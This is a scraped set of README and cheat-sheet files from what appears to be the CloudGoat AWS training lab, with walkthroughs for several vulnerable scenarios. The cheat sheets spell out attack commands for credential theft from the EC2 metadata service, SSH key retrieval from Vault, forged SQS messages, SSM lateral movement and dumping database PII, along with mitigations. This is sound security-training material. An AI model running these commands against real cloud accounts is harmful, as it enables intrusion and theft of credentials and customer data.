attacker finds information about environment variables and a HashiCorp endpoint (located on port 8200 of the EC2 instance).\r\n4. By enumerating the scenario's Lambda function, the attacker locates the web application's API key and uses it to obtain the HashiCorp vault token.\r\n5. The attacker leverages the vault token to log in to the HashiCorp endpoint and acquires the id_rsa key, which grants SSH access to the EC2 instance hosting the web application.\r\n6. Intrigued by the login message, the attacker queries the EC2 metadata service and discovers that IMDSv2 is in use.\r\n7. The attacker queries the EC2 metadata service again, using a token in the header of the request to successfully obtain a response.\r\n8. After enumerating the EC2 metadata service, the attacker decides to list available DynamoDB tables and discovers a table containing IAM user credentials specific to the scenario.\r\n9. Utilizing the newly acquired IAM user credentials, the attacker retrieves the final secret from the Secrets Manager, successfully completing the scenario.\r\n\r\nA cheat sheet for the scenario is available [here](./cheat_sheet.md).\r\n", "timestamp": "2025-10-24T11:39:53.511299"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/secrets_in_the_cloud/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/secrets_in_the_cloud/cheat_sheet.md", "content": "```\r\nexport AWS_ACCESS_KEY_ID=[low-priv-user]\r\nexport AWS_SECRET_ACCESS_KEY=[low-priv-user]\r\n```\r\n\r\n`aws s3 ls`\r\n\r\n`aws s3 ls s3://[bucket]`\r\n\r\n`aws s3 cp s3://[bucket]/nates_web_app_url.txt .`\r\n\r\n`cat nates_web_app_url.txt`\r\n\r\n`aws lambda list-functions`\r\n\r\n`export VAULT_ADDR='http://[web_app_ip]:8200'`\r\n\r\n`vault login TorysTotallyTubular456`\r\n\r\n`vault kv get secret/id_rsa`\r\n\r\n`echo \"[id_rsa]\" >> id_rsa`\r\n\r\n`chmod 400 id_rsa`\r\n\r\n`ssh -i id_rsa ec2-user@[web_app_ip]`\r\n\r\n`TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")`\r\n\r\n`curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/info`\r\n\r\n`aws dynamodb list-tables`\r\n\r\n`aws dynamodb scan --table-name [table]`\r\n\r\n```\r\nexport AWS_ACCESS_KEY_ID=[secrets-manager-user]\r\nexport AWS_SECRET_ACCESS_KEY=[secrets-manager-user]\r\n```\r\n\r\n`aws secretsmanager list-secrets`\r\n\r\n`aws secretsmanager get-secret-value --secret-id [secret]`\r\n", "timestamp": "2025-10-24T11:39:53.741389"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/sns_secrets/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sns_secrets/README.md", "content": "# Scenario: sns_secrets\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `$ ./cloudgoat.py create sns_secrets`\n\n**TryHackMe Room:** [SNS Secrets Walkthrough](https://tryhackme.com/jr/snssecretswalkthrough)\n\n## Scenario Resources\n\n- 1 EC2 instance\n- 1 SNS topic\n- 1 API Gateway REST API\n- 1 IAM role\n- 1 IAM user\n\n## Scenario Start(s)\n\n1. AWS Access Key and Secret Key\n\n## Scenario Goal(s)\n\nGet the final flag by invoking the API Gateway with the leaked API key.\n\n## Summary\n\nIn this scenario, you are given AWS credentials. Your task is to enumerate permissions and discover that you have the ability to list and subscribe to SNS topics. Use Pacu's new modules, \"sns__enum\" and \"sns__subscribe,\" to subscribe to the topic. You will receive an email from the topic containing an API Key as a debug message. Next, use the AWS CLI to enumerate the API Gateways and find the path, method, stage, and resource of the API Gateway. Finally, perform a curl request with the API key to retrieve the final flag.\n\n## Exploitation Route\n\n![Lucidchart Diagram](exploitation_route.png \"Exploitation Route\")\n\n## Walkthrough - SNS Secrets\n\n1. Start by enumerating the permissions of the provided AWS access key and secret key.\n2. Enumerate SNS topics using the `sns__enum` module in Pacu to list the available topics.\n3. Subscribe to the identified SNS topic using the `sns__subscribe` module in Pacu.\n4. Confirm the subscription via the email you receive.\n5. Wait for the SNS topic to publish messages and check your email for a message containing an API Key.\n6. Enumerate API Gateways using the AWS CLI to find the API Gateway path, method, stage, and resource.\n7. Identify the correct method and stage for the API Gateway.\n8. Use `curl` with the API Key to invoke the API Gateway and retrieve the final flag.\n\nA detailed cheat sheet & walkthrough for this route is available [here](./cheat_sheet.md). \n", "timestamp": "2025-10-24T11:39:54.568159"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/sns_secrets/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sns_secrets/cheat_sheet.md", "content": "# SNS_Secrets Walkthrough\n\n## Summary\n\nIn this scenario, you are provided with AWS credentials. You need to enumerate permissions and discover you can list and subscribe to SNS topics. You then use Pacu's new modules \"sns__enum\" and \"sns__subscribe\" to subscribe to the topic. You will receive an email from the topic with an API Key as a debug message. Then, use the AWS CLI to enumerate the API Gateways to find the API Gateway path, method, stage, and resource. Finally, do a curl request with the API key to get the final flag.\n\nThere is a detailed walkthrough on TryHackMe for this scenario: [SNS Secrets Walkthrough](https://tryhackme.com/jr/snssecretswalkthrough)\n\n## Video Walkthrough\n[![SNS_Secrets Video Walkthrough](https://i9.ytimg.com/vi/LBkuZa6niR0/mqdefault.jpg?v=665d1bd4&sqp=CIiU97IG&rs=AOn4CLAyCbeb1g5M58sdghxtQlC_dZECLw)](https://www.youtube.com/watch?v=LBkuZa6niR0)\n\n## Detailed Walkthrough\n\n### Configuring the AWS Keys\n\nAfter launching the scenario, you will be provided with an Access Key ID and Secret Access Key for an IAM role. These allow you to interact with the AWS account from the IAM role using the CLI (Command Line Interface). You can set up an IAM profile with this command:\n\n```bash\naws configure --profile sns-secrets\n```\n\nYou will then be prompted for the Access Key ID, Secret, and Region. Provide the keys you received after launching the scenario. Below is an example (your keys will be different.)  \n\n```bash\nAWS Access Key ID: AKIA2GIZ2CSU6NO2YIXU\nAWS Secret Access Key: SYpZBG++MXkmdvmUL614A4XAAs9L88QRrMOBhqZ9\nDefault region name: us-east-1\nDefault output format [None]:\n```\n\nFinally, you can confirm access by running the AWS equivalent of ‚Äúwhoami‚Äù: \n\n```bash\naws sts get-caller-identity --profile sns-secrets \n```\n\nThis should return the UserId, Account, and ARN for the role to verify you have access. \n\n### Discovering Permissions\n\nNow that we have access to an IAM user in the AWS environment, we need to figure out what permissions we have. This can be done using the AWS CLI. First, we need to see what policies are connected to our user: \n(Note: The username can be found in the output of the ‚Äúaws sts get-caller-identity‚Äù command we ran previously). \n\n```bash\naws iam list-user-policies --user-name [UserName] --profile sns-secrets\n```\n\nThis command will return the policy name for our account. We can further enumerate this policy: \n\n```bash\naws iam get-user-policy --user-name [UserName] --policy-name [PolicyName] --profile sns-secrets \n```\n\nThe output of this command provides us with our policy; note our IAM User has permissions related to SNS, IAM, and API Gateway. \n\n### Subscribing to SNS\n\nAmazon Simple Notification Service (SNS) is a managed messaging service that enables you to send notifications to subscribers using various methods like email, SMS, and HTTP. It's often used for alerting, sending updates, and integrating different systems by delivering messages reliably and quickly. It's important to limit SNS access to specific users to ensure the security and integrity of your messaging system. Unrestricted access could lead to unauthorized users sending spam, triggering unnecessary alerts, or accessing sensitive information.\n\nWe can enumerate SNS with Pacu. Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Instructions for installing Pacu are out-of-scope for this walkthrough but you can refer to the [official Pacu documentation on Github](https://github.com/RhinoSecurityLabs/pacu). Once Pacu is installed and a session is configured, you can import the profile you configured: \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > import_keys sns-secrets\n```\n\nThere are two modules for interacting with SNS; you can find these by searching within Pacu: \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > search sns\n\n[Category: ENUM]\n\n    List and describe Simple Notification Service topics\n\n  sns__enum\n\n[Category: LATERAL_MOVE]\n\n    Subscribe to a Simple Notification Service (SNS) topic\n\n  sns__subscribe\n```\n\nLet‚Äôs begin with the ‚Äúsns__enum‚Äù module. We can get more information with this command:\n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > help sns__enum\n```\n\nThe module will attempt to list and gather information from Simple Notification Service topics. Let‚Äôs run it and see if it identifies an SNS topic we can access. \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > run sns__enum --region us-east-1\n```\n\nWe can see the topic by typing ‚Äúdata‚Äù to access the Pacu database for our session. \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > data\n```\n\nNow that we have the full ARN of the SNS Topic, let‚Äôs check out the sns__subscribe module: \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > help sns__subscribe\n```\n\nThis module will attempt to subscribe to a topic based on the ARN via an email address. We need to provide it with the topic and an email. \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > run sns__subscribe --topics [TopicARN] --email [Email Address]\n```\n\nAfter subscribing, you will need to go to your email and confirm the subscription: \n\n![Confirm Subscription](confirm-subscription.png)\n\n### Accessing the API Gateway\n\nAfter subscribing to the topic, you will receive an SNS Message that leaks an API Key for a API Gateway. \n\n![Leaked API Key](leaked-apikey.png)\n\nNow that we have an API Key for an API Gateway, we need to identify the full URL to access the gateway. First, let‚Äôs try and retrieve basic information on the API: \n\n```bash\naws apigateway get-rest-apis --profile sns-secrets --region us-east-1\n```\n\nThis provides us with the ID of the API Gateway. Using this ID we can get the stages and resources: \n\n```bash\naws apigateway get-stages --rest-api-id [API ID] --profile sns-secrets --region us-east-1\naws apigateway get-resources --rest-api-id [API ID] --profile sns-secrets --region us-east-1\n```\n\nThese commands provide us with the following information:\n\n- Stage Name\n- Resource Path\n\n![API Gateway Information](apigateway-info.png)\n\nThis information allows us to retrieve the full URL to the API Gateway:\n\n```bash\nhttps://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]\n```\n\nFinally, we can use a CURL request with the API Key to retrieve the final flag: \n\n```bash\ncurl -X GET \\\n  'https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]' \\\n  -H 'x-api-key: 45a3da610dc64703b10e273a4db135bf'\n```\n\n![Final Flag](final-flag.png)\n", "timestamp": "2025-10-24T11:39:54.704410"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/sqs_flag_shop/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sqs_flag_shop/README.md", "content": "\r\n# Scenario : SQS_FLAG_Shop\r\n\r\n**Size:**¬†Medium\r\n**Difficulty:**¬†Easy\r\n\r\n**Command:**¬†`$ ./cloudgoat.py create sqs_flag_shop`\r\n\r\n### Scenario Resources\r\n\r\n- 1 VPC with:\r\n    - Lambda  x 1\r\n    - RDS x1\r\n    - EC2 x1\r\n- SQS\r\n- IAM Users x 1\r\n\r\n### Scenario Start(s)\r\n\r\n1 IAM User, Web address\r\n\r\n## Scenario Goal(s)\r\n\r\nBuy FLAG successfully on the shop site\r\n\r\n## Summary\r\n\r\nThe first web page will be provided. Attackers check the privileges they currently have and perform privilege escalation. Find and analyze the hidden web source code, and think about how you can buy ‚ÄúFLAG‚Äù using the privileges you have!\r\n\r\n## Exploitation Route(s)\r\n\r\n![Scenario Route(s)](assets/route.png)\r\n\r\n## Route Walkthrough\r\n\r\n1. The attacker accesses the web page and identifies the features first\r\n2. The attacker checks the privileges it has\r\n3. Find the web source code. By analyzing the source code, the attacker checks the format of message sent to the SQS service\r\n4. Assume the the sending message role about SQS service\r\n5. The attacker, who possesses the necessary permissions, sends a forged message to the SQS service queue\r\n6. Check the changed assets, purchase FLAG and check the secret-string\r\n\r\n**A cheat sheet for this route is available [here](cheat_sheet.md)**\r\n", "timestamp": "2025-10-24T11:39:55.472340"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/sqs_flag_shop/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sqs_flag_shop/cheat_sheet.md", "content": "# CloudGoat Walkthrough: SQS Flag Shop Scenario\r\n\r\n## Deploying the Scenario\r\n\r\nOnce the Terraform process is complete, the starting data for the scenario will be provided. The output will look like:\r\n\r\n```\r\n[cloudgoat] terraform output completed with no error code.\r\ncg_web_site_ip = 34.XXX.XXX.XXX:XXXX\r\ncloudgoat_output_sqsuser_access_key_id = AKIXXXXXXXXXXXXXXXXX\r\ncloudgoat_output_sqsuser_secret_key = isbXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\r\n```\r\n\r\n## Setting Up AWS Profile\r\n\r\nThe scenario provides a set of AWS credentials. Let‚Äôs create an AWS profile on the command line:\r\n\r\n```sh\r\n$ aws configure --profile sqs_user\r\n\r\nAWS Access Key ID [******************QP]:\r\nAWS Secret Access Key [******************2U]:\r\nDefault region name [us-east-1]:\r\nDefault output format [json]:\r\n```\r\n\r\nAfter setting up the profile for an AWS account, the first command to run is the AWS equivalent to ‚Äòwhoami‚Äô so we can understand more about our user.\r\n\r\n```sh\r\n$ aws --profile sqs_user sts get-caller-identity\r\n\r\n{\r\n    \"UserId\": \"XXXXXXXXXXXXXXXXXXZF4\",\r\n    \"Account\": \"XXXXXXXXXXXX\",\r\n    \"Arn\": \"arn:aws:iam::XXXXXXXX:user/cg-sqs-user-sqs_flag_shop_cgidbXXXXXXXXX\"\t \r\n}\r\n```\r\n\r\nThis returns a JSON object containing:\r\n\r\n- **UserId**\r\n- **Account**\r\n- **Arn**\r\n\r\nMore information about **Amazon Resource Names (ARNs)** can be found in the [AWS Documentation](https://docs.aws.amazon.com/).\r\n\r\n## Enumerating User Policies\r\n\r\nAWS policies define permissions for identities and resources. Let‚Äôs see what policies are associated with our user:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam list-user-policies --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXX\r\n\r\n{\r\n   \"PolicyNames\": [\r\n      \"cg-sqs-scenario-assumed-role-policy\"\r\n    ]\r\n}\r\n```\r\n\r\nThis user has one attached policy. Let‚Äôs view its contents:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam get-user-policy --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX --policy-name cg-sqs-scenario-assumed-role-policy\r\n\r\n{\r\n   \"UserName\": \"cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX\",\r\n   \"PolicyName\": \"cg-sqs-scenario-assumed-role-policy\",\r\n   \"PolicyDocument\": {\r\n       \"Version\": \"2012-10-17\",\r\n       \"Statement\": [\r\n           {\r\n               \"Action\": [\r\n                   \"iam:Get*\",\r\n                   \"iam:List*\"\r\n               ],\r\n               \"Effect\": \"Allow\",\r\n               \"Resource\": \"*\",\r\n               \"Sid\": \"VisualEditor0\"\r\n           },\r\n           {\r\n               \"Action\": \"sts:AssumeRole\",\r\n               \"Effect\": \"Allow\",\r\n               \"Resource\": \"arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role\",\r\n               \"Sid\": \"VisualEditor1\"\r\n           }\r\n       ]\r\n   }\r\n}\r\n```\r\n\r\nThis policy allows us to assume a role! Let‚Äôs check the policies attached to that role:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam list-role-policies --role-name cg-sqs_send_msg_role\r\n\r\n{\r\n    \"PolicyNames\": [\r\n        \"cg-sqs_scenario_policy\"\r\n    ]\r\n}\r\n```\r\n\r\nThe role `cg-sqs_send_msg_role` has the attached policy `cg-sqs_scenario_policy`. Let‚Äôs inspect it:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam get-role-policy --role-name cg-sqs_send_msg_role --policy-name cg-sqs_scenario_policy\r\n\r\n{\r\n\t\"RoleName\": \"cg-sqs_send_msg_role\",\r\n\t\"PolicyName\": \"cg-sqs_scenario_policy\",\r\n\t\"PolicyDocument\": {\r\n    \t\"Version\": \"2012-10-17\",\r\n    \t\"Statement\": [\r\n        \t{\r\n            \t\"Action\": [\r\n                \t\"sqs:GetQueueUrl\",\r\n                \t\"sqs:SendMessage\"\r\n            \t],\r\n            \t\"Effect\": \"Allow\",\r\n            \t\"Resource\": \"arn:aws:sqs:us-east-1:XXXXXXXXXXXX:cash_charging_queue\",\r\n            \t\"Sid\": \"VisualEditor0\"\r\n        \t}\r\n    \t]\r\n\t}\r\n}\r\n```\r\n\r\n## Assuming the SQS Role\r\n\r\nSince we can assume the role, let's do it:\r\n\r\n```sh\r\n$ aws --profile sqs_user sts assume-role --role-arn arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role --role-session-name sqs_send_role\r\n\r\n{\r\n\t\"Credentials\": {\r\n    \t\"AccessKeyId\": \"XXXXXXXXXXXXXXXXLOT5\",\r\n    \t\"SecretAccessKey\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXQPgU\",\r\n    \t\"SessionToken\": \"XXX...XXX\" ,\r\n    \t\"Expiration\": \"2024-02-08T23:29:43+00:00\"\r\n\t},\r\n\t\"AssumedRoleUser\": {\r\n    \t\"AssumedRoleId\": \"XXXXXXXXXXXXXXXXXX2GJ:sqs_send_role\",\r\n    \t\"Arn\": \"arn:aws:sts::XXXXXXXXXXXX:assumed-role/cg-sqs_send_msg_role/sqs_send_role\"\r\n\t}\r\n}\r\n```\r\n\r\nConfigure an AWS profile for this assumed role:\r\n\r\n```\r\n[sqs_send_role]\r\naws_access_key_id = ASIAXXXXXXXXXXXXXXXX\r\naws_secret_access_key = WmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\r\naws_session_token = IQoXXXXXXXX...\r\n```\r\n\r\n## Finding the SQS Queue URL\r\n\r\n```sh\r\n$ aws --profile sqs_send_role sqs get-queue-url --queue-name cash_charging_queue\r\n\r\n{\r\n    \"QueueUrl\": \"https://sqs.us-east-1.amazonaws.com/XXXXXXXX/cash_charging_queue\"\r\n}\r\n```\r\n\r\n## Web Application Analysis\r\n\r\nVisiting the `cg_web_site_ip` in a browser displays a shopping website. Analyzing the network requests reveals a **POST request** when ordering a banana. The website's source code contains a function for `charge_cash`, which accepts a JSON message:\r\n\r\n```json\r\n{\r\n    \"charge_amount\": 100000000\r\n}\r\n```\r\n\r\n## Sending an SQS Message\r\n\r\nWe can send a message to the queue using:\r\n\r\n```sh\r\n$ aws --profile sqs_send_role sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/XXXXXXX/cash_charging_queue --message-body '{\"charge_amount\": 100000000}'\r\n\r\n{\r\n\t\"MD5OfMessageBody\": \"a539XXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\r\n\t\"MessageId\": \"67dcXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\"\r\n}\r\n```\r\n\r\nRefreshing the web application now reflects the increased balance, allowing us to purchase the flag.\r\n\r\n## Conclusion\r\n\r\nIn this **SQS Flag Shop CloudGoat scenario**, we:\r\n\r\n1. Enumerated user permissions.\r\n2. Assumed a new role with additional permissions.\r\n3. Analyzed the web application to discover its internal logic.\r\n4. Sent a crafted AWS SQS message to increase balance and obtain the flag.\r\n\r\nThis walkthrough demonstrates how to leverage AWS IAM and SQS permissions in cloud security challenges.\r\n", "timestamp": "2025-10-24T11:39:55.884994"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/vpc_peering_overexposed/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vpc_peering_overexposed/README.md", "content": "# Scenario: vpc_peering_overexposed\n\n---\n\n- Size: Medium\n- Difficulty: Moderate\n- Command: ./cloudgoat.py create vpc_peering_overexposed\n\n## Scenario Resources\n\n---\n\n- 2 VPCs (Dev and Prod) with VPC Peering\n- 2 EC2 instances (1 in Dev VPC, 1 in Prod VPC)\n- 1 RDS MySQL instance (in Prod VPC)\n- IAM Users, Roles, and Policies\n- Security Groups and Route Tables\n- SSM VPC Endpoints (in Prod VPC)\n- S3 Gateway Endpoint (in Prod VPC)\n- Web Server with insecure configuration files\n- Database with mock PII data\n\n## Scenario Start(s)\n\n---\n\n1. AWS Access Key and Secret Key for a low-privileged user & SSH key\n\n## Scenario Goal(s)\n\n---\n\nExploit a series of AWS misconfigurations:\n\n1. Enumerate AWS environment\n\n2. Access EC2 metadata to steal IAM credentials\n\n3. Exploit VPC peering misconfigurations\n\n4. Move laterally via SSM to Prod EC2\n\n5. Access sensitive customer data in RDS\n\n## Summary\n\n---\n\nIn this scenario, you are given AWS credentials to a low-privileged user, simulating an assumed breach scenario. Your task is to enumerate the AWS environment, identify vulnerable EC2 instances, exploit the EC2 metadata service to gain higher privileges, take advantage of misconfigured VPC peering and security groups to pivot into a production environment which should have been segmented from Dev, and finally access sensitive PII data from an RDS MySQL database. \n\nThis scenario is inspired by the 2021 data breach of a major TELCO company, where attackers exploited similar misconfigurations to gain unauthorized access to customer data. The breach resulted in the exposure of personal information belonging to approximately 50 million customers.\n\n****Note: Some AWS CLI commands in this lab may appear redundant. This is intentional one of the learning objectives is to gain hands-on experience with AWS CLI enumeration techniques and become comfortable reading and interpreting raw JSON outputs. Understanding how to extract meaningful information from these responses is a critical skill in both offensive and defensive cloud security roles.****\n\n## Exploitation Route\n\n![FlowChart.png](FlowChart.png)\n\n## Attack Path Steps:\n\n---\n\n1. Use initial IAM credentials to enumerate AWS resources\n\n2. Connect to Dev EC2 via SSH (the instance has a public IP and SSH open to whitelisted IPs)\n\n3. Exploit IMDSv1 to steal IAM credentials from the Dev EC2 instance\n\n4. Use the stolen elevated credentials to discover Prod environment resources\n\n5. Use SSM Session Manager with the elevated credentials to move laterally to Prod EC2\n\n6. Discover database credentials in the web server configuration files\n\n7. Access and view sensitive customer data\n\n## TELCO Breach Relation\n\n---\n\nThis scenario simulates several key aspects of a large TELCO breach in 2021:\n\n1. Initial access to a development environment\n\n2. Exploitation of IAM misconfigurations\n\n3. Abuse of network segmentation weaknesses\n\n4. Lateral movement to production systems\n\n5. Access to customer PII data\n\n**While simplified for educational purposes, the scenario teaches the same cloud security principles that could have prevented the actual breach.**\n\n## Mitigation Strategies\n\n---\n\n1. Enforce IMDSv2 on all EC2 instances\n\n2. Implement least privilege IAM policies\n\n3. Properly segment networks with restrictive VPC peering\n\n4. Implement stricter security group rules\n\n5. Enable enhanced monitoring and logging\n\nA detailed cheat sheet & walkthrough for this scenario is available [here](./cheat_sheet.md).", "timestamp": "2025-10-24T11:39:56.762835"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/vpc_peering_overexposed/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vpc_peering_overexposed/cheat_sheet.md", "content": "Cheat Sheet - vpc_peering_overexposed\n---\n\n### Stage 1: Assumed Breach & Reconnaissance\n\n---\n\n1. Configure AWS CLI with the provided credentials:\n\n```bash\n# Enter the provided Access Key, Secret Key, and region (us-east-1)\naws configure --profile \n```\n\n2. Enumerate EC2 instances to locate potential public targets:\n\n```bash\naws ec2 describe-instances --query \"Reservations[*].Instances[*].PublicIpAddress\" --output text --profile \n```\n\n3. Discover EC2 instances (look for \"Environment=Development\" tag):\n\n```bash\n# Confirm Dev instance identity using its Environment tag\naws ec2 describe-instances --profile\n```\n\n4. You can filter for Dev EC2 instances only (look for \"Environment=Development\" tag):\n\n```bash\n# Confirm Dev instance identity using its Environment tag\naws ec2 describe-instances --filters \"Name=tag:Environment,Values=Development\" --profile\n```\n\n5. Identify VPC configurations and networking:\n\n```bash\n# Identify available VPCs to understand the network boundaries.\naws ec2 describe-vpcs --profile \n\n# Get details on subnets within each VPC to determine where resources (EC2, RDS) might reside.\naws ec2 describe-subnets --profile \n\n# Analyze route tables to find peering routes that may expose Prod resources to Dev VPC.\n# You're looking for routes with destination CIDRs pointing to peered VPCs.\naws ec2 describe-route-tables --profile \n```\n\n6. Connect to the Dev EC2 instance:\n    ‚Ä¢ The CloudGoat scenario automatically generates an SSH key pair (cloudgoat.pem) in the scenario directory. Use it to connect to the Dev EC2 instance:\n\n```bash\n# chmod 400 cloudgoat.pem ¬†*# If necessary (on Linux/Mac)*\nssh -i cloudgoat.pem ec2-user@<public-ip-address>\n```\n\n### Stage 2: Metadata Credential Theft\n\n---\n\n1. From the Dev EC2 instance (while in SSH session), test if IMDSv1 is enabled:\n\n```bash\n# Test if EC2 Metadata Service (IMDSv1) is enabled\ncurl http://169.254.169.254/latest/meta-data/\n```\n\n2. Retrieve the IAM role name attached to the instance:\n\n```bash\n# This should return the role name, e.g., \"dev-ec2-role-abc123\"\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\n3. Retrieve the temporary credentials from the metadata service:\n\n```bash\n# Replace \"dev-ec2-role-abc123\" with the actual role name from the previous step\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/dev-ec2-role-abc123\n```\n\n4. Configure AWS CLI with the stolen credentials:\n\n```bash\n# Configure a new AWS CLI profile using the temporary credentials\naws configure --profile \n\n# Add the session token manually (AWS CLI v2 does not prompt for it)\naws configure set aws_session_token <Token from the metadata output> --profile \n\n\n```\n\n5. Verify that you now have elevated permissions:\n\n```bash\naws sts get-caller-identity --profile\n```\n\n### Stage 3: VPC Peering Enumeration\n\n---\n\n1. Enumerate VPC peering connections to identify misconfigured network paths:\n    ‚Ä¢ Now that you're using the EC2 instance role, you may see peering connections that weren't visible before and you need to confirm that Dev-to-Prod peering (pcx-xxxxxxxxx) is still active and misconfigured. \n\n```bash\naws ec2 describe-vpc-peering-connections --profile\n```\n\n2. Examine route tables to confirm routing between Dev and Prod VPCs:\n\n```bash\naws ec2 describe-route-tables --profile\n```\n\n3. Identify security group configurations that might allow lateral movement:\n\n```bash\naws ec2 describe-security-groups --profile\n```\n\n4. Look for EC2 instances in the Prod VPC:\n\n```bash\n# Example output showing a Prod EC2 instance: i-0abc123def456789 Note the instance ID:\naws ec2 describe-instances --filters \"Name=tag:Environment,Values=Production\" \"Name=instance-state-name,Values=running\" --profile\n```\n\n### Stage 4: Lateral Movement via SSM\n\n---\n\n1. Now with the elevated credentials from the Dev EC2 role, check if the Prod instance is SSM-managed:\n\n```bash\naws ssm describe-instance-information --profile\n```\n\n2. Start an SSM session to the Prod EC2 instance:\n\n```bash\n# Replace i-0abc123def456789 with the actual Prod EC2 instance ID\naws ssm start-session --target i-0abc123def456789 --profile\n```\n\n3. Confirm access to the production environment (You should be logged on as the ssm-user):\n\n```bash\n# Identify user\nwhoami\n```\n\n4. Switch to root user:\n\n```bash\n# Switch user\nsudo -i\n\n# Identify user\nwhoami\n```\n\n### Stage 5: Data Access\n\n---\n\n1. Locate database connection details on the Prod EC2:\n\n```bash\n# Web configuration file to extract the credentials\ncat /var/www/config/.env\n```\n\n2. Connect to the MySQL RDS instance using the discovered credentials:\n\n```bash\n# Now connect to the MySQL database using these credentials\nmysql -h $DB_HOST -u $DB_USER -p$DB_PASSWORD $DB_NAME\n```\n\n3. Query sensitive customer data:\n\n```bash\nUSE customerdb;\nSHOW TABLES;\nSELECT * FROM customers;\n```\n\n**Congratulations! You have successfully completed the scenario by accessing sensitive customer data in the production database. This demonstrates how a series of AWS misconfigurations can lead to unauthorized access to sensitive information.**\n\n## Mitigation Recommendations\n\n---\n\n1. Enforce IMDSv2 on all EC2 instances\n    1. Set `HttpTokens` to `required` for all EC2 instances\n    2. Implement an AWS Config rule to monitor and enforce this setting\n    3. Example: `aws ec2 modify-instance-metadata-options --instance-id i-1234567890abcdef0 --http-tokens required --http-endpoint enabled`\n2. Implement least privilege for IAM roles and policies\n    1. Remove overly permissive wildcards (`*`) from policy statements\n    2. Use AWS Access Analyzer to identify unused permissions\n    3. Implement permission boundaries for roles and users\n3. Properly segment VPC environments with restrictive peering\n    1. Limit route table entries to only required CIDR blocks\n    2. Use NACLs in addition to security groups for network segmentation\n    3. Consider using AWS Transit Gateway with proper route table configurations for more complex networks\n4. Apply proper security group rules\n    1. Restrict ingress to specific source IPs/security groups and ports\n    2. Avoid overly permissive rules like \"0.0.0.0/0\"\n    3. Use AWS Firewall Manager to enforce security group policies across accounts\n5. Implement additional network controls\n    1. Use VPC Endpoints for AWS services to avoid traffic over the internet\n    2. Implement VPC Flow Logs to monitor network traffic\n    3. Consider deploying IDS/IPS solutions like AWS Network Firewall\n6. Enable enhanced monitoring and logging\n    1. Enable CloudTrail for all AWS API calls\n    2. Configure GuardDuty for threat detection\n    3. Set up CloudWatch alarms for suspicious activities\n    4. Implement real-time alerting for security events\n\n## MITRE ATT&CK Mapping\n\n---\n\n- Initial Access: T1078.004 - Valid Accounts: Cloud Accounts\n    - Description: Attackers obtained valid AWS credentials for initial access\n- Credential Access: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API\n    - Description: Attackers exploited IMDSv1 to steal IAM role credentials\n- Discovery: T1580 - Cloud Infrastructure Discovery\n    - Description: Attackers used AWS CLI commands to enumerate VPCs, EC2 instances, and networking configurations\n- Lateral Movement: T1021 - Remote Services\n    - Description: Attackers used AWS Systems Manager (SSM) Session Manager to gain access to the Linux Prod EC2 instance\n- Collection: T1005 - Data from Local System\n    - Description: Attackers found RDS credentials stored on the Prod EC2 instance\n\n## TELCO Breach Reference\n\n---\n\nThe 2021 TELCO breach involved attackers gaining unauthorized access to development environments and eventually making their way to production systems. Key similarities between this scenario and the actual breach include:\n\n1.Initial access to development/testing environments: In both cases, attackers started with access to non-production environments that should have been properly isolated.\n\n1. Exploitation of IAM misconfigurations: In the actual breach, attackers exploited over-permissioned accounts and roles to escalate privileges, similar to the role 